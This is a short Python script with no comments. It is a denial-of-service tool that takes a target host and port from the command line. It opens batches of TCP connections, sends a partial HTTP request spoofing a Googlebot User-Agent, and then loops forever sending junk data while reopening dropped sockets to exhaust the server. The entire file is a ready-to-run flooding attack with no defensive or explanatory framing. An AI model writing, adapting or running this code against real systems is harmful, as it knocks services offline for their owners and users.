import socket,sys,random
from threading import Thread

sockets = []
try:
    sys.argv[1]
    sys.argv[2]
except:
    sys.exit(0)

def start_socket(TARGET,PORTA,HEADER):
    for i in range(0,100):
        try:
            sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            sock.connect((TARGET,PORTA))
            sock.send(HEADER)
            sockets.append(sock)
        except:
            pass

def attack(TARGET,PORTA,HEADER):
    while True:
        for sock in sockets:
            try:
                sock.send('A'*2048)
            except socket.error:
                sockets.remove(sock)               
        start_socket(TARGET,PORTA,HEADER)

def _flood(TARGET,PORTA):
    if 'http://' in TARGET:
        TARGET = TARGET.replace('http://', '')
    elif 'https://' in TARGET:
        TARGET = TARGET.replace('https://','')
    else:
        pass
    
    HEADER = "GET /?{} HTTP/1.1\r\n".format(random.randint(1,2000))
    HEADER += "Connection: keep-alive\r\n"
    HEADER += "User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\r\n"

    attack(TARGET,PORTA,HEADER)

_flood(sys.argv[1],int(sys.argv[2]))